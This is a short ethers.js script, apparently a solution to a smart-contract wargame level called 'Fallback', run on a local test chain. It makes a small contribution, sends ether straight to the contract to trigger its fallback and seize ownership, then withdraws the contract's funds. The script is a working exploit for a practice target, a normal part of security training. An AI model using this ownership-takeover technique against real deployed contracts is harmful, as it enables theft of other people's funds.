// 01/index.js
import { ethers } from "ethers";

export default async function (contractAddress, arg1, arg2) {
  const provider = new ethers.JsonRpcProvider("http://127.0.0.1:8545");
  const [signer] = await provider.listAccounts().then(accounts =>
    accounts.map(a => provider.getSigner(a))
  );

  const Fallback = new ethers.Contract(contractAddress, [
    "function contribute() external payable",
    "function withdraw() external",
    "function owner() view returns (address)"
  ], signer);

  console.log("Attacker address:", await signer.getAddress());

  await (await Fallback.contribute({ value: ethers.parseEther("0.0001") })).wait();
  await (await signer.sendTransaction({ to: contractAddress, value: ethers.parseEther("0.0001") })).wait();

  console.log("New owner:", await Fallback.owner());

  await (await Fallback.withdraw()).wait();
}

